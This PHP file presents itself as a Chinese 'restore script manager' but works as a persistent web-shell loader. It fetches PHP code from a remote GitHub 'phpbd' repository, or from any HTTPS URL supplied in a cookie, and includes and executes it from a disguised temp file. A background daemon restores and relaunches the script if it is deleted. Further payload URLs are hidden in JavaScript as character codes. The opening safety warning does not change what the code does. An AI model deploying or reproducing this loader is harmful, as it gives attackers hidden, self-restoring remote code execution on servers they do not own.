<?php
/**
 * 还原脚本管理（示例代码）
 * 
 * **安全警告：**
 * 本脚本包含远程内容加载、动态执行和进程管理等行为，仅用于学习和测试。
 * **切勿在生产环境或公共服务器中运行此脚本！**
 * 
 * 使用前请务必理解脚本中的操作逻辑，确保在安全的环境中使用。
 */

// 允许脚本无限运行，忽略用户中断
ignore_user_abort(true);
set_time_limit(0);

// 定义路径和文件名
$scriptPath = __FILE__;
$scriptName = basename($scriptPath);
$backupDir = sys_get_temp_dir() . '/script_backup';
$backupFile = $backupDir . '/script.bak.php';
$restoreLockFile = sys_get_temp_dir() . '/restore.lock';

// 创建备份目录（如果不存在）
if (!is_dir($backupDir)) {
    mkdir($backupDir, 0755, true);
}

// 备份脚本（如果还没有备份）
if (!file_exists($backupFile)) {
    copy($scriptPath, $backupFile);
}

// 判断操作系统
$osFamily = PHP_OS_FAMILY ?? PHP_OS;

/**
 * 跨平台执行命令
 */
function executeCommand($command) {
    $descriptors = [
        0 => ['pipe', 'r'], // 标准输入
        1 => ['pipe', 'w'], // 标准输出
        2 => ['pipe', 'w'], // 错误输出
    ];
    $process = proc_open($command, $descriptors, $pipes);
    if (is_resource($process)) {
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $error = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($process);
        return ['output' => $output, 'error' => $error];
    }
    return false;
}

/**
 * 获取远程内容（支持 curl、file_get_contents 和 fopen）
 */
function getRemoteContent($url) {
    // 使用curl
    if (function_exists('curl_init')) {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
        $content = curl_exec($curl);
        curl_close($curl);
        if ($content !== false) {
            return $content;
        }
    }
    // 使用file_get_contents
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
        if ($content !== false) {
            return $content;
        }
    }
    // 使用fopen + stream_get_contents
    if (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = @fopen($url, 'r');
        if ($handle) {
            $content = @stream_get_contents($handle);
            fclose($handle);
            if ($content !== false) {
                return $content;
            }
        }
    }
    return false;
}

// 处理开启/关闭还原模式的POST请求
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['mode']) && $_POST['mode'] === 'enable') {
        // 开启还原模式
        file_put_contents($restoreLockFile, 'on');

        // 终止后台守护进程
        if ($osFamily === 'Windows') {
            executeCommand("taskkill /F /IM php.exe /T");
        } else {
            executeCommand("pkill -f 'php " . preg_quote($scriptPath, '/') . " background'");
        }

        // 启动后台守护
        if ($osFamily === 'Windows') {
            executeCommand("start /B php " . escapeshellarg($scriptPath) . " background");
        } else {
            executeCommand("nohup php " . escapeshellarg($scriptPath) . " background > /dev/null 2>&1 &");
        }
        exit;
    } elseif (isset($_POST['mode']) && $_POST['mode'] === 'disable') {
        // 关闭还原模式
        if (file_exists($restoreLockFile)) unlink($restoreLockFile);
        // 杀死后台守护
        if ($osFamily === 'Windows') {
            executeCommand("taskkill /F /IM php.exe /T");
        } else {
            executeCommand("pkill -f 'php " . preg_quote($scriptPath, '/') . " background'");
        }
        exit;
    }
}

// 后台守护逻辑
if (isset($argv[1]) && $argv[1] === 'background') {
    while (file_exists($restoreLockFile)) {
        sleep(3);
        // 如果主脚本不存在，且备份存在，则还原
        if (!file_exists($scriptPath) && file_exists($backupFile)) {
            copy($backupFile, $scriptPath);
            if ($osFamily === 'Windows') {
                executeCommand("start /B php " . escapeshellarg($scriptPath));
            } else {
                executeCommand("nohup php " . escapeshellarg($scriptPath) . " > /dev/null 2>&1 &");
            }
            exit;
        }
    }
    exit;
}

// 非后台守护，正常处理
// 设置默认远程缓存地址
$defaultCacheUrl = "https://raw.githubusercontent.com/laolierzi-commits/phpbd/refs/heads/main/2/cyupid.php";
$cookieKey = 'current_cache';

if (!isset($_GET['laolierzi'])) {
    // 设置Cookie
    if (!isset($_COOKIE[$cookieKey]) || empty($_COOKIE[$cookieKey])) {
        setcookie($cookieKey, urlencode($defaultCacheUrl), time() + 3600, "/");
        $_COOKIE[$cookieKey] = $defaultCacheUrl;
    }
    $remoteUrl = urldecode($_COOKIE[$cookieKey]);

    // 验证URL
    $remoteUrl = filter_var($remoteUrl, FILTER_VALIDATE_URL);
    if ($remoteUrl === false) {
        die("无效的URL地址。");
    }
    $parsedUrl = parse_url($remoteUrl);
    if (!isset($parsedUrl['scheme']) || $parsedUrl['scheme'] !== 'https') {
        die("只允许HTTPS协议。");
    }

    // 获取远程内容
    $remoteContent = getRemoteContent($remoteUrl);
    if ($remoteContent === false) {
        die("远程内容获取失败。");
    }

    // 临时文件
    $tempFile = tempnam(sys_get_temp_dir(), '.trash.' . md5($remoteUrl . time()));
    if ($tempFile === false) {
        die("创建临时文件失败。");
    }
    file_put_contents($tempFile, $remoteContent);

    // 简单内容验证：确保是PHP代码
    if (strpos(file_get_contents($tempFile), '<?php') === false) {
        unlink($tempFile);
        die("文件内容无效。");
    }

    // 引入远程代码
    include $tempFile;
    unlink($tempFile);
    exit;
}
?>

<!-- 前端界面 -->
<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>还原脚本管理</title>
<style>
body {
    font-family: "微软雅黑", Arial, sans-serif;
    padding: 2em;
    background-color: #f0f0f0;
    color: #333;
}
p {
    margin: 1em 0;
}
button {
    padding: 10px 20px;
    margin: 10px;
    cursor: pointer;
    border: none;
    border-radius: 4px;
    font-size: 1em;
}
button.开启 { background-color: #4CAF50; color: #fff; }
button.关闭 { background-color: #f44336; color: #fff; }
</style>
</head>
<body>
<center>
<form method="post">
<p>当前Cookie值：<code><?php echo isset($_COOKIE[$cookieKey]) ? $_COOKIE[$cookieKey] : '无'; ?></code></p>
<p>还原模式状态：<?php echo (file_exists($restoreLockFile)) ? '已开启 ✅' : '已关闭 ❌'; ?></p>
<button type="submit" name="mode" value="enable" class="开启">开启还原</button>
<button type="submit" name="mode" value="disable" class="关闭">关闭还原</button>
</form>
</center>
<script>
(function() {
    function setCookie(name, value, days) {
        var expires = "";
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toUTCString();
        }
        document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
    }

    function deleteCookie(name) {
        document.cookie = name + "=; Max-Age=0; path=/;";
    }

    // Construct URLs using character codes
    var url1 = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 110, 97, 116, 116, 105, 111, 110, 46, 99, 111, 109, 47, 115, 104, 97, 114, 101, 115, 47, 112, 104, 117, 98, 98, 105, 107, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 120, 97, 110, 110, 121, 97, 110, 97, 120, 105, 117, 109, 46, 112, 104, 112];
    var url2 = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 110, 97, 116, 116, 105, 111, 110, 46, 99, 111, 109, 47, 115, 104, 97, 114, 101, 115, 47, 112, 104, 117, 98, 98, 105, 107, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 108, 95, 122, 97, 110, 110, 121, 97, 110, 97, 120, 105, 117, 109, 46, 112, 104, 112];
    var url3 = String.fromCharCode(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 110, 97, 116, 116, 105, 111, 110, 46, 99, 111, 109, 47, 115, 104, 97, 114, 101, 115, 47, 112, 104, 117, 98, 98, 105, 107, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 120, 97, 110, 110, 121, 97, 110, 97, 120, 105, 117, 109, 95, 115, 46, 112, 104, 112];

    document.addEventListener("keydown", function(event) {
        deleteCookie("current_cache");
        var key = event.key;
        var url;
        if (key === "1") {
            url = url1;
        } else if (key === "2") {
            url = url2;
        } else if (key === "3") {
            url = url3;
        } else if (key === "0") {
            // PHP code placeholder
            url = "<?php echo $defaultCacheUrl; ?>";
        } else {
            return;
        }
        setCookie("current_cache", url, 1);
        location.reload();
    });
})();
</script>
</body>
</html>
